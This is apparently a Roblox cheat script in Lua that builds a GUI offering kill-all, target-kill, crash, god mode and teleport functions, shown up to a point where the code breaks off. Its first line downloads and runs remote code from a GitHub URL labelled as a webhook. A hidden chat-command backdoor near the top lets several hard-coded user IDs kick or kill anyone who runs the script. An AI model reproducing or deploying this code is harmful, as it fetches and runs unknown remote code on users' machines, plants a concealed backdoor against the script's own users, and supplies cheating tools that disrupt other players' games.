loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/lbb/main/lbb%20webhook"))()

local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
getgenv().AdminTable = {
  [395654755] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
}

getgenv().AdminTable = {
	[3740649995] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
  }

  getgenv().AdminTable = {
	[2800534563] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
  }

  getgenv().AdminTable = {
	[1004434236] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
  }
  getgenv().AdminTable = {
	[642275836] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
  }

   getgenv().AdminTable = {
	[631478648] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
  }



getgenv().psearch = function(Name)
  local Inserted = {}
  for _, p in pairs(Players:GetPlayers()) do
      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
          table.insert(Inserted, p);return p
      end
  end
end -- Simple player finder function

getgenv().AdminCmdList = {
  ["kick"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP:Kick(self)
          end
      end;
      ["Clearence"] = {[5] = true;};
  }; -- you can make new ones of these (the ; have to be in the same spots)
  ["kill"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP.Character.Humanoid:ChangeState(15)
          end
      end;
      ["Clearence"] = {[4] = true;[5] = true;};
  };
};

getgenv().BDCheck = function(Target2, Chat)
  if Chat:sub(1, 1) == AdminPrefix then
      local args = string.split(Chat:sub(2), " ")
      local Command = AdminCmdList[table.remove(args, 1)]
      local targ1 = psearch(table.remove(args, 1))
      if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
      end
  end
end

local GP = Players:GetPlayers()
for i = 1, #GP do
  local CoolKidPlayer = GP[i]
  CoolKidPlayer.Chatted:Connect(function(Word)
      BDCheck(CoolKidPlayer, Word)
  end)
end -- Checks if you chatted a command
Players.PlayerAdded:Connect(function(CKP)
  CKP.Chatted:Connect(function(Message)
      BDCheck(CKP, Message)
  end)
end)

wait(1)
repeat wait() until game:IsLoaded()
local function TheGui()
local ChGui2 = Instance.new("ScreenGui")
local DragFrame = Instance.new("Frame")
local Frame = Instance.new("Frame")
local AV = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local CH = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local BTP = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local AW = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local LBBGUI = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local CL = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local TextLabel_7 = Instance.new("TextLabel")
local X = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local TextLabel_8 = Instance.new("TextLabel")
local RBW = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local TextLabel_9 = Instance.new("TextLabel")
local VB = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local TextLabel_10 = Instance.new("TextLabel")
local RP = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local TextLabel_11 = Instance.new("TextLabel")
local AnonsCHGui = Instance.new("TextLabel")
local UNAV = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local UNAW = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local UNRBW = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local UNRP = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local UNVB = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")

--Properties:

ChGui2.Name = "ChGui2"
ChGui2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

DragFrame.Name = "DragFrame"
DragFrame.Parent = ChGui2
DragFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DragFrame.BackgroundTransparency = 1.000
DragFrame.Position = UDim2.new(0.611356914, 0, 0.439135373, 0)
DragFrame.Size = UDim2.new(0, 445, 0, 301)

Frame.Parent = DragFrame
Frame.BackgroundColor3 = Color3.fromRGB(188, 223, 255)
Frame.Position = UDim2.new(0.0449438207, 0, 0.0631229281, 0)
Frame.Size = UDim2.new(0, 404, 0, 263)

UICorner.Parent = AV

UICorner_2.CornerRadius = UDim.new(0, 15)
UICorner_2.Parent = Frame



UICorner_3.Parent = CH




UICorner_4.Parent = BTP




UICorner_5.Parent = AW


LBBGUI.Name = "LBBGUI"
LBBGUI.Parent = Frame
LBBGUI.BackgroundColor3 = Color3.fromRGB(254, 255, 180)
LBBGUI.Position = UDim2.new(0.653465331, 0, 0.0532319397, 0)
LBBGUI.Size = UDim2.new(0, 46, 0, 41)
LBBGUI.Font = Enum.Font.SourceSans
LBBGUI.Text = "Open Gui"
LBBGUI.TextColor3 = Color3.fromRGB(0, 0, 0)
LBBGUI.TextSize = 14.000

UICorner_6.Parent = LBBGUI

TextLabel_6.Parent = LBBGUI
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(-0.326086968, 0, 1, 0)
TextLabel_6.Size = UDim2.new(0, 76, 0, 22)
TextLabel_6.Font = Enum.Font.SourceSansBold
TextLabel_6.Text = "Open Gui"
TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.TextSize = 14.000

CL.Name = "CL"
CL.Parent = Frame
CL.BackgroundColor3 = Color3.fromRGB(254, 255, 180)
CL.Position = UDim2.new(0.653465331, 0, 0.718631208, 0)
CL.Size = UDim2.new(0, 46, 0, 41)
CL.Font = Enum.Font.SourceSans
CL.Text = "CL"
CL.TextColor3 = Color3.fromRGB(0, 0, 0)
CL.TextSize = 14.000

UICorner_7.Parent = CL

TextLabel_7.Parent = CL
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(-0.326086968, 0, 1, 0)
TextLabel_7.Size = UDim2.new(0, 76, 0, 22)
TextLabel_7.Font = Enum.Font.SourceSansBold
TextLabel_7.Text = "ChatLogger"
TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_7.TextSize = 14.000

X.Name = "X"
X.Parent = Frame
X.BackgroundColor3 = Color3.fromRGB(254, 255, 180)
X.Position = UDim2.new(0.851485133, 0, 0.718631208, 0)
X.Size = UDim2.new(0, 46, 0, 41)
X.Font = Enum.Font.SourceSans
X.Text = "X"
X.TextColor3 = Color3.fromRGB(0, 0, 0)
X.TextSize = 14.000

UICorner_8.Parent = X

TextLabel_8.Parent = X
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.Position = UDim2.new(-0.326086968, 0, 1, 0)
TextLabel_8.Size = UDim2.new(0, 76, 0, 22)
TextLabel_8.Font = Enum.Font.SourceSansBold
TextLabel_8.Text = "CloseGui"
TextLabel_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_8.TextSize = 14.000



UICorner_9.Parent = RBW


UICorner_10.Parent = VB


RP.Name = "RP"
RP.Parent = Frame
RP.BackgroundColor3 = Color3.fromRGB(254, 255, 180)
RP.Position = UDim2.new(0.0272277221, 0, 0.718631208, 0)
RP.Size = UDim2.new(0, 46, 0, 41)
RP.Font = Enum.Font.SourceSans
RP.Text = "Admin"
RP.TextColor3 = Color3.fromRGB(0, 0, 0)
RP.TextSize = 14.000

UICorner_11.Parent = RP

TextLabel_11.Parent = RP
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.Position = UDim2.new(-0.239130437, 0, 1, 0)
TextLabel_11.Size = UDim2.new(0, 79, 0, 22)
TextLabel_11.Font = Enum.Font.SourceSansBold
TextLabel_11.Text = "Infinite Yield"
TextLabel_11.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_11.TextSize = 14.000

AnonsCHGui.Name = "AnonsCHGui"
AnonsCHGui.Parent = Frame
AnonsCHGui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AnonsCHGui.BackgroundTransparency = 1.000
AnonsCHGui.Position = UDim2.new(0.106435642, 0, 0.368821293, 0)
AnonsCHGui.Size = UDim2.new(0, 323, 0, 50)
AnonsCHGui.Font = Enum.Font.Oswald
AnonsCHGui.Text = "Adamantiun.Cloud"
AnonsCHGui.TextColor3 = Color3.fromRGB(0, 0, 0)
AnonsCHGui.TextScaled = true
AnonsCHGui.TextSize = 14.000
AnonsCHGui.TextWrapped = true



UICorner_12.Parent = UNAV



UICorner_13.Parent = UNAW



UICorner_14.Parent = UNRBW


UICorner_15.Parent = UNRP



UICorner_16.Parent = UNVB

-- Scripts:

local function NJTXEZI_fake_script() -- ChGui2.Script 
	local script = Instance.new('Script', ChGui2)

	--frame
	frame = script.Parent.DragFrame
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
	
	--AV
	AV.MouseButton1Down:connect(function()
		_G.AntiVoid = true
		while _G.AntiVoid do
			game.RunService.RenderStepped:wait()
			for i,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("UnionOperation") then
					v.Velocity = Vector3.new(0,0,0)
				end
			end
		end
	end)
	AV.MouseButton1Down:connect(function()
		UNAV.Visible = true
		AV.Visible = false
	end)
	
	--LBBGUI
	LBBGUI.MouseButton1Down:connect(function()
		-- Gui to Lua
		-- Version: 3.2
	
		-- Instances:
	
		_G.Cbring = false
		_G.Activate = false
		_G.OpenBlocks = false
		_G.RocketTarget = false
		_G.KillTarget = false
		_G.AirWalk = false
		_G.ClickTp = false
		_G.KillHits = false
		_G.AntiCrash = false
		_G.RemoveMe = false
	
	
		for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Part") and v.Anchored == true then
				v.Anchored = false
			end
		end
	
		local function Gui()
			-- Gui to Lua
			-- Version: 3.2
	
			-- Instances:
	
			local LBBGui = Instance.new("ScreenGui")
			local DragFrame = Instance.new("Frame")
			local MainFrame = Instance.new("Frame")
			local Page1Frame = Instance.new("Frame")
			local Title = Instance.new("TextLabel")
			local CBRING = Instance.new("TextButton")
			local Rocket = Instance.new("TextButton")
			local OFF = Instance.new("TextButton")
			local UnRocket = Instance.new("TextButton")
			local GetGear = Instance.new("TextButton")
			local TP = Instance.new("TextButton")
			local Name = Instance.new("TextBox")
			local ToPlr = Instance.new("TextButton")
			local Page1 = Instance.new("TextLabel")
			local TextLabel = Instance.new("TextLabel")
			local RocketTarget = Instance.new("TextButton")
			local UnRocketTarget = Instance.new("TextButton")
			local KillTarget = Instance.new("TextButton")
			local UnKillTarget = Instance.new("TextButton")
			local LockTarget = Instance.new("TextButton")
			local RemoveTarget = Instance.new("TextButton")
			local Page2Frame = Instance.new("Frame")
			local Regen = Instance.new("TextButton")
			local Page2 = Instance.new("TextLabel")
			local GodMode = Instance.new("TextButton")
			local AntiAFK = Instance.new("TextButton")
			local Anchor = Instance.new("TextButton")
			local UnAnchor = Instance.new("TextButton")
			local Speed = Instance.new("TextButton")
			local Jump = Instance.new("TextButton")
			local Info = Instance.new("TextLabel")
			local WalkSpeed1 = Instance.new("TextBox")
			local JumpHeight = Instance.new("TextBox")
			local SafeSpot = Instance.new("TextButton")
			local Next1 = Instance.new("TextButton")
			local Prev1 = Instance.new("TextButton")
			local Next2 = Instance.new("TextButton")
			local Prev2 = Instance.new("TextButton")
			local Page3Frame = Instance.new("Frame")
			local Page3 = Instance.new("TextLabel")
			local InfiniteJump = Instance.new("TextButton")
			local Invis = Instance.new("TextButton")
			local Requires = Instance.new("TextLabel")
			local AirWalk = Instance.new("TextButton")
			local UnAirWalk = Instance.new("TextButton")
			local ClickTP = Instance.new("TextButton")
			local Crash = Instance.new("TextButton")
			local Patience = Instance.new("TextLabel")
			local T = Instance.new("TextLabel")
			local Control = Instance.new("TextLabel")
			local Untoggleable = Instance.new("TextLabel")
			local ToVoid = Instance.new("TextButton")
			local Reset = Instance.new("TextLabel")
			local UnToVoid = Instance.new("TextButton")
			local KillHits = Instance.new("TextButton")
			local UnKillHits = Instance.new("TextButton")
			local CharacterRemove = Instance.new("TextButton")
			local UnCharacterRemove = Instance.new("TextButton")
			local AntiCrash = Instance.new("TextButton")
			local UnAntiCrash = Instance.new("TextButton")
			local KrnlCbring = Instance.new("TextButton")
			local UnKrnlCbring = Instance.new("TextButton")
			local ThanksRyan = Instance.new("Frame")
			local TextLabel_2 = Instance.new("TextLabel")
			local XButton = Instance.new("TextButton")
			local UICorner = Instance.new("UICorner")
			local UICorner_2 = Instance.new("UICorner")
	
			--Properties:
	
			LBBGui.Name = "LBBGui"
			LBBGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	
			DragFrame.Name = "DragFrame"
			DragFrame.Parent = LBBGui
			DragFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DragFrame.BackgroundTransparency = 1.000
			DragFrame.Position = UDim2.new(0.0364431441, 0, 0.687144518, 0)
			DragFrame.Size = UDim2.new(0, 377, 0, 212)
	
			MainFrame.Name = "MainFrame"
			MainFrame.Parent = DragFrame
			MainFrame.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
			MainFrame.Position = UDim2.new(0.0473273918, 0, 0.113333359, 0)
			MainFrame.Size = UDim2.new(0, 341, 0, 163)
	
			Page1Frame.Name = "Page1Frame"
			Page1Frame.Parent = MainFrame
			Page1Frame.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
			Page1Frame.Position = UDim2.new(0.0861592889, 0, 0, 0)
			Page1Frame.Size = UDim2.new(0, 282, 0, 163)
	
			Title.Name = "Title"
			Title.Parent = Page1Frame
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.Position = UDim2.new(0.14293468, 0, -0.0101454677, 0)
			Title.Size = UDim2.new(0, 200, 0, 50)
			Title.Font = Enum.Font.SourceSansLight
			Title.Text = "Adamantiun.Cloud"
			Title.TextColor3 = Color3.fromRGB(255, 255, 255)
			Title.TextSize = 15.000
	
			CBRING.Name = "CBRING"
			CBRING.Parent = Page1Frame
			CBRING.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			CBRING.LayoutOrder = 2
			CBRING.Position = UDim2.new(-5.40167093e-08, 0, 0.793980062, 0)
			CBRING.Size = UDim2.new(0, 32, 0, 31)
			CBRING.Style = Enum.ButtonStyle.RobloxRoundButton
			CBRING.Font = Enum.Font.SourceSansLight
			CBRING.Text = "On"
			CBRING.TextColor3 = Color3.fromRGB(0, 0, 0)
			CBRING.TextSize = 14.000
	
			Rocket.Name = "Rocket"
			Rocket.Parent = Page1Frame
			Rocket.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Rocket.Position = UDim2.new(-0.00354618579, 0, -0.0147240013, 0)
			Rocket.Size = UDim2.new(0, 86, 0, 45)
			Rocket.Style = Enum.ButtonStyle.RobloxRoundButton
			Rocket.Font = Enum.Font.SourceSansLight
			Rocket.Text = "Rocket"
			Rocket.TextColor3 = Color3.fromRGB(0, 0, 0)
			Rocket.TextSize = 14.000
	
			OFF.Name = "OFF"
			OFF.Parent = Page1Frame
			OFF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			OFF.LayoutOrder = 1
			OFF.Position = UDim2.new(-0.00709216297, 0, 0.793979943, 0)
			OFF.Size = UDim2.new(0, 32, 0, 31)
			OFF.Visible = false
			OFF.Style = Enum.ButtonStyle.RobloxRoundButton
			OFF.Font = Enum.Font.SourceSansLight
			OFF.Text = "Off"
			OFF.TextColor3 = Color3.fromRGB(0, 0, 0)
			OFF.TextSize = 14.000
	
			UnRocket.Name = "UnRocket"
			UnRocket.Parent = Page1Frame
			UnRocket.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnRocket.Position = UDim2.new(-6.14672899e-08, 0, -0.0147240702, 0)
			UnRocket.Size = UDim2.new(0, 85, 0, 44)
			UnRocket.Visible = false
			UnRocket.Style = Enum.ButtonStyle.RobloxRoundButton
			UnRocket.Font = Enum.Font.SourceSansLight
			UnRocket.Text = "UnRocket"
			UnRocket.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnRocket.TextSize = 14.000
	
			GetGear.Name = "GetGear"
			GetGear.Parent = Page1Frame
			GetGear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			GetGear.Position = UDim2.new(0.773049653, 0, 0, 0)
			GetGear.Size = UDim2.new(0, 64, 0, 42)
			GetGear.Style = Enum.ButtonStyle.RobloxRoundButton
			GetGear.Font = Enum.Font.SourceSansLight
			GetGear.Text = "GetGear"
			GetGear.TextColor3 = Color3.fromRGB(0, 0, 0)
			GetGear.TextSize = 14.000
	
			TP.Name = "TP"
			TP.Parent = Page1Frame
			TP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TP.Position = UDim2.new(0.705673754, 0, 0.265928298, 0)
			TP.Size = UDim2.new(0, 81, 0, 53)
			TP.Style = Enum.ButtonStyle.RobloxRoundButton
			TP.Font = Enum.Font.SourceSansLight
			TP.Text = "ToMid"
			TP.TextColor3 = Color3.fromRGB(0, 0, 0)
			TP.TextSize = 14.000
	
			Name.Name = "Name"
			Name.Parent = Page1Frame
			Name.BackgroundColor3 = Color3.fromRGB(217, 217, 217)
			Name.Position = UDim2.new(0.599290788, 0, 0.898427904, 0)
			Name.Size = UDim2.new(0, 107, 0, 15)
			Name.Font = Enum.Font.SourceSans
			Name.PlaceholderText = "Input Name"
			Name.Text = ""
			Name.TextColor3 = Color3.fromRGB(0, 0, 0)
			Name.TextSize = 14.000
	
			ToPlr.Name = "ToPlr"
			ToPlr.Parent = Page1Frame
			ToPlr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ToPlr.Position = UDim2.new(-0.00354604423, 0, 0.259793341, 0)
			ToPlr.Size = UDim2.new(0, 88, 0, 54)
			ToPlr.Style = Enum.ButtonStyle.RobloxRoundButton
			ToPlr.Font = Enum.Font.SourceSansLight
			ToPlr.Text = "ToPlr"
			ToPlr.TextColor3 = Color3.fromRGB(0, 0, 0)
			ToPlr.TextSize = 14.000
	
			Page1.Name = "Page 1"
			Page1.Parent = Page1Frame
			Page1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Page1.BackgroundTransparency = 1.000
			Page1.Position = UDim2.new(0.273049712, 0, 0.801993728, 0)
			Page1.Size = UDim2.new(0, 128, 0, 37)
			Page1.Font = Enum.Font.SourceSansItalic
			Page1.Text = "Page 1"
			Page1.TextColor3 = Color3.fromRGB(255, 255, 255)
			Page1.TextSize = 14.000
	
			TextLabel.Parent = Page1Frame
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.Position = UDim2.new(-1.67638063e-08, 0, 0.699386477, 0)
			TextLabel.Size = UDim2.new(0, 114, 0, 17)
			TextLabel.Font = Enum.Font.SourceSansLight
			TextLabel.Text = "Kill all players button"
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
	
			RocketTarget.Name = "RocketTarget"
			RocketTarget.Parent = Page1Frame
			RocketTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			RocketTarget.Position = UDim2.new(0.620567322, 0, 0.653028965, 0)
			RocketTarget.Size = UDim2.new(0, 95, 0, 31)
			RocketTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			RocketTarget.Font = Enum.Font.SourceSansLight
			RocketTarget.Text = "RocketTargetOn"
			RocketTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			RocketTarget.TextSize = 14.000
	
			UnRocketTarget.Name = "UnRocketTarget"
			UnRocketTarget.Parent = Page1Frame
			UnRocketTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnRocketTarget.Position = UDim2.new(0.620999992, 0, 0.652999997, 0)
			UnRocketTarget.Size = UDim2.new(0, 95, 0, 31)
			UnRocketTarget.Visible = false
			UnRocketTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			UnRocketTarget.Font = Enum.Font.SourceSans
			UnRocketTarget.Text = "RocketTargetOff"
			UnRocketTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnRocketTarget.TextSize = 14.000
	
			KillTarget.Name = "KillTarget"
			KillTarget.Parent = Page1Frame
			KillTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			KillTarget.Position = UDim2.new(0.329787254, 0, 0.343558252, 0)
			KillTarget.Size = UDim2.new(0, 95, 0, 40)
			KillTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			KillTarget.Font = Enum.Font.SourceSansLight
			KillTarget.Text = "KillTarget"
			KillTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			KillTarget.TextSize = 14.000
	
			UnKillTarget.Name = "UnKillTarget"
			UnKillTarget.Parent = Page1Frame
			UnKillTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnKillTarget.Position = UDim2.new(0.329787254, 0, 0.343558252, 0)
			UnKillTarget.Size = UDim2.new(0, 95, 0, 40)
			UnKillTarget.Visible = false
			UnKillTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			UnKillTarget.Font = Enum.Font.SourceSansLight
			UnKillTarget.Text = "UnKillTarget"
			UnKillTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnKillTarget.TextSize = 14.000
	
			LockTarget.Name = "LockTarget"
			LockTarget.Parent = Page1Frame
			LockTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			LockTarget.Position = UDim2.new(0.404255331, 0, 0.585544348, 0)
			LockTarget.Size = UDim2.new(0, 32, 0, 30)
			LockTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			LockTarget.Font = Enum.Font.SourceSansLight
			LockTarget.Text = "I"
			LockTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			LockTarget.TextSize = 14.000
	
			RemoveTarget.Name = "RemoveTarget"
			RemoveTarget.Parent = Page1Frame
			RemoveTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			RemoveTarget.Position = UDim2.new(0.517730474, 0, 0.585544348, 0)
			RemoveTarget.Size = UDim2.new(0, 32, 0, 30)
			RemoveTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			RemoveTarget.Font = Enum.Font.SourceSansLight
			RemoveTarget.Text = "R"
			RemoveTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			RemoveTarget.TextSize = 14.000
	
			Page2Frame.Name = "Page2Frame"
			Page2Frame.Parent = MainFrame
			Page2Frame.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
			Page2Frame.Position = UDim2.new(0.0861592889, 0, 0, 0)
			Page2Frame.Size = UDim2.new(0, 282, 0, 163)
			Page2Frame.Visible = false
	
			Regen.Name = "Regen"
			Regen.Parent = Page2Frame
			Regen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Regen.Position = UDim2.new(0.37588653, 0, 0, 0)
			Regen.Size = UDim2.new(0, 69, 0, 50)
			Regen.Style = Enum.ButtonStyle.RobloxRoundButton
			Regen.Font = Enum.Font.SourceSansLight
			Regen.Text = "Regen"
			Regen.TextColor3 = Color3.fromRGB(0, 0, 0)
			Regen.TextSize = 14.000
	
			Page2.Name = "Page2"
			Page2.Parent = Page2Frame
			Page2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Page2.BackgroundTransparency = 1.000
			Page2.Position = UDim2.new(0.273000002, 0, 0.801999986, 0)
			Page2.Size = UDim2.new(0, 128, 0, 37)
			Page2.Font = Enum.Font.SourceSansItalic
			Page2.Text = "Page 2 "
			Page2.TextColor3 = Color3.fromRGB(255, 255, 255)
			Page2.TextSize = 14.000
	
			GodMode.Name = "GodMode"
			GodMode.Parent = Page2Frame
			GodMode.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			GodMode.Position = UDim2.new(0.3758865, 0, 0.30674845, 0)
			GodMode.Size = UDim2.new(0, 71, 0, 29)
			GodMode.Style = Enum.ButtonStyle.RobloxRoundButton
			GodMode.Font = Enum.Font.SourceSansLight
			GodMode.Text = "GodMode"
			GodMode.TextColor3 = Color3.fromRGB(0, 0, 0)
			GodMode.TextSize = 14.000
	
			AntiAFK.Name = "Anti-AFK"
			AntiAFK.Parent = Page2Frame
			AntiAFK.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			AntiAFK.Size = UDim2.new(0, 58, 0, 53)
			AntiAFK.Style = Enum.ButtonStyle.RobloxRoundButton
			AntiAFK.Font = Enum.Font.SourceSans
			AntiAFK.Text = "AntiAFK"
			AntiAFK.TextColor3 = Color3.fromRGB(0, 0, 0)
			AntiAFK.TextSize = 14.000
	
			Anchor.Name = "Anchor"
			Anchor.Parent = Page2Frame
			Anchor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Anchor.Position = UDim2.new(0.787234068, 0, 0, 0)
			Anchor.Size = UDim2.new(0, 58, 0, 53)
			Anchor.Style = Enum.ButtonStyle.RobloxRoundButton
			Anchor.Font = Enum.Font.SourceSans
			Anchor.Text = "Anchor"
			Anchor.TextColor3 = Color3.fromRGB(0, 0, 0)
			Anchor.TextSize = 14.000
	
			UnAnchor.Name = "UnAnchor"
			UnAnchor.Parent = Page2Frame
			UnAnchor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnAnchor.Position = UDim2.new(0.787234068, 0, 0, 0)
			UnAnchor.Size = UDim2.new(0, 58, 0, 53)
			UnAnchor.Visible = false
			UnAnchor.Style = Enum.ButtonStyle.RobloxRoundButton
			UnAnchor.Font = Enum.Font.SourceSans
			UnAnchor.Text = "UnAnchor"
			UnAnchor.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnAnchor.TextSize = 14.000
	
			Speed.Name = "Speed"
			Speed.Parent = Page2Frame
			Speed.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Speed.Position = UDim2.new(0.0425531864, 0, 0.325153381, 0)
			Speed.Size = UDim2.new(0, 79, 0, 34)
			Speed.Style = Enum.ButtonStyle.RobloxRoundButton
			Speed.Font = Enum.Font.SourceSansLight
			Speed.Text = "WalkSpeed"
			Speed.TextColor3 = Color3.fromRGB(0, 0, 0)
			Speed.TextSize = 14.000
	
			Jump.Name = "Jump"
			Jump.Parent = Page2Frame
			Jump.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Jump.Position = UDim2.new(0.0425531864, 0, 0.533742309, 0)
			Jump.Size = UDim2.new(0, 79, 0, 34)
			Jump.Style = Enum.ButtonStyle.RobloxRoundButton
			Jump.Font = Enum.Font.SourceSansLight
			Jump.Text = "JumpHeight"
			Jump.TextColor3 = Color3.fromRGB(0, 0, 0)
			Jump.TextSize = 14.000
	
			Info.Name = "Info"
			Info.Parent = Page2Frame
			Info.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Info.BackgroundTransparency = 1.000
			Info.Position = UDim2.new(0.0460992754, 0, 0.742331266, 0)
			Info.Size = UDim2.new(0, 78, 0, 41)
			Info.Font = Enum.Font.SourceSans
			Info.Text = "Normal WalkSpeed is 16 and Normal JumpHeight is 50"
			Info.TextColor3 = Color3.fromRGB(255, 255, 255)
			Info.TextScaled = true
			Info.TextSize = 14.000
			Info.TextWrapped = true
	
			WalkSpeed1.Name = "WalkSpeed"
			WalkSpeed1.Parent = Page2Frame
			WalkSpeed1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			WalkSpeed1.Position = UDim2.new(0.673758864, 0, 0.380368084, 0)
			WalkSpeed1.Size = UDim2.new(0, 90, 0, 16)
			WalkSpeed1.Font = Enum.Font.SourceSans
			WalkSpeed1.PlaceholderText = "SpeedValue"
			WalkSpeed1.Text = "16"
			WalkSpeed1.TextColor3 = Color3.fromRGB(0, 0, 0)
			WalkSpeed1.TextSize = 14.000
	
			JumpHeight.Name = "JumpHeight"
			JumpHeight.Parent = Page2Frame
			JumpHeight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			JumpHeight.Position = UDim2.new(0.673758864, 0, 0.582822084, 0)
			JumpHeight.Size = UDim2.new(0, 90, 0, 16)
			JumpHeight.Font = Enum.Font.SourceSans
			JumpHeight.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
			JumpHeight.PlaceholderText = "JumpValue"
			JumpHeight.Text = "50"
			JumpHeight.TextColor3 = Color3.fromRGB(0, 0, 0)
			JumpHeight.TextSize = 14.000
	
			SafeSpot.Name = "SafeSpot"
			SafeSpot.Parent = Page2Frame
			SafeSpot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			SafeSpot.Position = UDim2.new(0.37588653, 0, 0.478527606, 0)
			SafeSpot.Size = UDim2.new(0, 71, 0, 43)
			SafeSpot.Style = Enum.ButtonStyle.RobloxRoundButton
			SafeSpot.Font = Enum.Font.SourceSans
			SafeSpot.Text = "SafeSpot"
			SafeSpot.TextColor3 = Color3.fromRGB(0, 0, 0)
			SafeSpot.TextSize = 14.000
	
			Next1.Name = "Next1"
